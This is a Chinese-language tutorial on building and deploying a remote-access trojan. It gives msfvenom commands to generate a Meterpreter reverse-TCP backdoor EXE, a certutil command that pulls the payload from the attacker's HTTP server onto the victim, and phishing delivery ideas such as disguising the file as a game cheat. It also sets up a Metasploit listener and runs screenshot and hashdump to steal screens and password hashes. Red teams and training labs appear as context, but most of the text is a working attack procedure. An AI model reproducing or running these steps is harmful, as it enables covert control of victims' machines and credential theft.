# 远控木马

远程控制木马被红队广泛使用，一般是由 Metasploit、CobaltStrike 等 C2 控制器生成的系统可执行文件，如 exe、elf、apk、macho 文件。

系统执行木马文件后，会反连至黑客服务器，黑客即可控制受害者计算机或移动设备，如开启摄像头、屏幕截图、文件管理、软件安装等操作。

---

## 一、使用 Metasploit 生成一个 EXE 安装包

Metasploit 让复杂的漏洞攻击流程变得非常简单，一个电脑小白经过几小时的学习，就能对操作系统等主流漏洞发起危害性攻击。

### 1. 使用 Metasploit 的 `msfvenom` 生成后门 EXE 文件

命令格式如下：

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<你的IP> lport=<你的端口> -f exe -o <文件名>.exe
```

- `LHOST`：指定攻击者的 IP 地址
- `LPORT`：指定攻击者的监听端口
- `<文件名>.exe`：输出的后门 EXE 文件名

---

## 二、将对应程序放入目标机

一般通过两种方式传播：

1. **文件上传漏洞 + 命令执行（主动）**：如大学 DVWA、Pikachu
2. **文件下载钓鱼 + 诱导执行（钓鱼）**：如 CF 外挂网站外挂.exe、Windows 病毒

### 1. 在攻击者机器上使用 Python 搭建 HTTP 服务器

```bash
python3 -m http.server <端口号>
```

### 2. 在目标 Windows 机器上自主使用 `certutil` 证书下载文件

```bash
certutil -urlcache -split -f http://<攻击者IP>:<端口号>/<文件名>.exe
```

---

## 三、开启 Metasploit 监听（msfconsole）

Metasploit 是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的 shellcode，并持续保持更新。

### 1. 进入 Metasploit 控制台

```bash
msfconsole
```

### 2. 使用模块并设置相关参数

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost <攻击者IP>
set lport <端口号>
```

### 3. 启动监听

```bash
run
```

---

## 四、尝试获取目标 Windows 机的信息

### 1. **截图命令**
获取目标机的当前屏幕截图：

```bash
screenshot
```

### 2. **获取密码**
尝试提取密码散列：

```bash
hashdump
```

> 注意：如果密码超过 8 位且包含多种元素，破解难度会增加。
